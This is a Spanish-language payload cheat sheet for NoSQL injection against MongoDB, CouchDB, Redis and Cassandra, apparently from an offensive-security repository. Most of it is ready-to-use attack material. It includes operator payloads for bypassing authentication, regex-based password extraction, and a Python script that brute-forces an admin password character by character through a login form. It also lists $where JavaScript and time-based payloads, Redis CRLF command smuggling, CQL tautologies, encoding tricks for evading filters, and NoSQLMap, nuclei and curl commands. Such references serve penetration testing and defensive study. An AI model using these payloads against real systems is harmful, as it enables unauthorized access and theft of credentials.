# 🍃 Payloads de inyección NoSQL

<!-- language-home-navigation -->
[🏠 Página principal en español](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](NoSQL-Injection.tr.md) • [🇬🇷 Ελληνικά](NoSQL-Injection.el.md)

```
███╗   ██╗ ██████╗ ███████╗ ██████╗ ██╗         ██╗███╗   ██╗     ██╗███████╗ ██████╗████████╗██╗ ██████╗ ███╗   ██╗
████╗  ██║██╔═══██╗██╔════╝██╔═══██╗██║         ██║████╗  ██║     ██║██╔════╝██╔════╝╚══██╔══╝██║██╔═══██╗████╗  ██║
██╔██╗ ██║██║   ██║███████╗██║   ██║██║         ██║██╔██╗ ██║     ██║█████╗  ██║        ██║   ██║██║   ██║██╔██╗ ██║
██║╚██╗██║██║   ██║╚════██║██║▄▄ ██║██║         ██║██║╚██╗██║██   ██║██╔══╝  ██║        ██║   ██║██║   ██║██║╚██╗██║
██║ ╚████║╚██████╔╝███████║╚██████╔╝███████╗    ██║██║ ╚████║╚█████╔╝███████╗╚██████╗   ██║   ██║╚██████╔╝██║ ╚████║
╚═╝  ╚═══╝ ╚═════╝ ╚══════╝ ╚══▀▀═╝ ╚══════╝    ╚═╝╚═╝  ╚═══╝ ╚════╝ ╚══════╝ ╚═════╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
```

---

## 🎯 Inyección MongoDB

> **Diferencias entre motores:** los operadores solo se inyectan si la aplicación transforma la entrada en una consulta compatible. `$where` necesita JavaScript habilitado y opera en documentos de nivel superior; el ejemplo anidado no es equivalente. CQL no admite las tautologías con OR de SQL como se presentan aquí, y `ALLOW FILTERING` no elimina la autenticación. Véanse [MongoDB `$where`](https://www.mongodb.com/docs/manual/reference/operator/query/where/) y la [gramática CQL](https://cassandra.apache.org/doc/latest/cassandra/developing/cql/dml.html).

### Evasión de autenticación
```javascript
// Inyección JSON
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$nin": []}, "password": {"$nin": []}}

// Codificado como URL
username[$ne]=&password[$ne]=
username[$gt]=&password[$gt]=
username[$regex]=.*&password[$regex]=.*
username[$exists]=true&password[$exists]=true
```

### Operadores habituales
```javascript
$eq     // Igual
$ne     // Distinto
$gt     // Mayor que
$gte    // Mayor o igual
$lt     // Less than
$lte    // Menor o igual
$in     // Dentro del array
$nin    // Fuera del array
$regex  // Expresión regular
$exists // El campo existe
$or     // OR lógico
$and    // AND lógico
$where  // Expresión JavaScript
```

---

## 💉 Payloads básicos

### Inyección en parámetros de URL
```
# Evasión de autenticación
username[$ne]=admin&password[$ne]=wrongpassword
username[$regex]=^a.*&password[$ne]=wrongpassword
username=admin&password[$ne]=wrongpassword

# Condiciones siempre verdaderas
{"$gt": ""}
{"$ne": null}
{"$ne": ""}
{"$exists": true}
```

### Inyección en el cuerpo JSON
```json
// Evasión básica
{"username": {"$ne": ""}, "password": {"$ne": ""}}

// Evasión mediante regex
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}

// Condición OR
{"$or": [{"username": "admin"}, {"username": {"$ne": ""}}]}

// Mayor que
{"username": "admin", "password": {"$gt": ""}}
```

---

## 🔥 Extracción de datos

### Extracción basada en regex
```javascript
// Extraer la contraseña carácter a carácter
password[$regex]=^a.*
password[$regex]=^b.*
password[$regex]=^c.*
...

// Extraer según la posición
password[$regex]=^.{0}a.*   // ¿El primer carácter es 'a'?
password[$regex]=^.{1}b.*   // ¿El segundo carácter es 'b'?

// Caracteres habituales
password[$regex]=^[a-z].*   // Empieza por minúscula
password[$regex]=^[A-Z].*   // Empieza por mayúscula
password[$regex]=^[0-9].*   // Empieza por un número
```

### Script de extracción booleana ciega
```python
import requests
import string

url = "http://target/login"
charset = string.ascii_letters + string.digits + "_@!#$%"
password = ""

while True:
    found = False
    for char in charset:
        payload = {
            "username": "admin",
            "password[$regex]": f"^{password}{char}.*"
        }
        r = requests.post(url, data=payload)
        if "Login successful" in r.text:
            password += char
            print(f"Found: {password}")
            found = True
            break
    if not found:
        break

print(f"Password: {password}")
```

---

## 🚀 Payloads avanzados

### Inyección JavaScript mediante $where
```javascript
// Basada en espera (ciega basada en tiempo)
{"$where": "sleep(5000)"}
{"username": {"$where": "sleep(5000)"}}

// Extracción de datos
{"$where": "this.password.length == 8"}
{"$where": "this.password[0] == 'a'"}
{"$where": "this.password.match(/^admin/)"}

// Basada en errores
{"$where": "this.constructor.constructor('return this.password')()"}
```

### Inyección de arrays
```json
// Operador $in
{"username": {"$in": ["admin", "administrator", "root"]}}

// Operador $nin
{"username": {"$nin": ["guest", "anonymous"]}}
```

### Inyección de operadores
```
# Convertir un campo en operador
username=admin&password[$ne]=wrongpassword

# Operador anidado
username[$eq]=admin&password[$regex]=^p

# Varios operadores
username[$gt]=&username[$lt]=z&password[$ne]=
```

---

## 🍃 Inyección CouchDB

### Payloads básicos
```javascript
// Evasión de autenticación
{"selector": {"username": {"$ne": ""}, "password": {"$ne": ""}}}

// Regex
{"selector": {"username": {"$regex": ".*"}}}

// Mayor que
{"selector": {"password": {"$gt": null}}}
```

### Inyección en vistas
```javascript
// Inyección en consultas Mango
{"selector": {"_id": {"$gt": null}}}

// Obtener todos los documentos
{"selector": {"_id": {"$regex": ".*"}}}
```

---

## 🔴 Inyección Redis

### Comandos básicos
```redis
# Enumeración de claves
KEYS *
SCAN 0

# Extracción de datos
GET key_name
HGETALL hash_name

# Establecer datos
SET key value
HSET hash field value
```

### Inyección de comandos mediante la aplicación
```
# Si la entrada del usuario llega a comandos Redis
username=admin\r\nKEYS *\r\n
username=admin%0d%0aKEYS *%0d%0a
```

---

## 📊 Inyección Cassandra

### Inyección CQL
```sql
-- Inyección básica
' OR '1'='1
' OR ''='

-- Evasión mediante ALLOW FILTERING
SELECT * FROM users WHERE username='admin' ALLOW FILTERING

-- Inyección de comentarios
admin'--
admin'/*
```

---

## 🛡️ Técnicas de evasión

### URL Codificación
```
$ne     →  %24ne
$gt     →  %24gt
$regex  →  %24regex
$where  →  %24where
```

### Evasión mediante Unicode
```
$ne     →  \u0024ne
$gt     →  \u0024gt
```

### Variantes de sintaxis de arrays
```
# Estándar
password[$ne]=

# Alternativa
password[0][$ne]=
password[][$ne]=
```

### Manipulación de Content-Type
```
# Cambiar de formulario a JSON
Content-Type: application/json

{"username": {"$ne": ""}, "password": {"$ne": ""}}
```

---

## 📝 Puntos de inyección

```
POST /login
- Parámetros del cuerpo (JSON/formulario)
- Parámetros de la cadena de consulta

GET /users?id=
- Parámetros de consulta

Cabeceras:
- Authorization
- Valores de cookies

Endpoints de API:
- GraphQL con MongoDB como backend
- Filtros de API REST
```

---

## 🔍 Lista de comprobación de detección

```markdown
□ Probar el operador $ne: {"field": {"$ne": ""}}
□ Probar el operador $gt: {"field": {"$gt": ""}}
□ Probar $regex: {"field": {"$regex": ".*"}}
□ Probar $where: {"$where": "1==1"}
□ Probar la sintaxis de arrays en URL: field[$ne]=
□ Probar operadores JSON
□ Comprobar diferencias en los tiempos de respuesta
□ Comprobar diferencias en la longitud de respuesta
□ Probar con diferentes tipos de contenido
```

---

## 🔗 Herramientas

```bash
# NoSQLMap
git clone https://github.com/codingo/NoSQLMap.git
python nosqlmap.py

# Escáner de inyección MongoDB
nuclei -t nosql-injection.yaml -u http://target

# Pruebas manuales con curl
curl -X POST http://target/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$ne": ""}, "password": {"$ne": ""}}'
```

---

## 🔗 Payloads relacionados

- [Payloads SQLi](./SQLi.es.md)
- [Inyección GraphQL](./GraphQL-Injection.es.md)

---

**Volver a los payloads:** [💉 Colección de payloads](../../README.md#-payloads-collection)
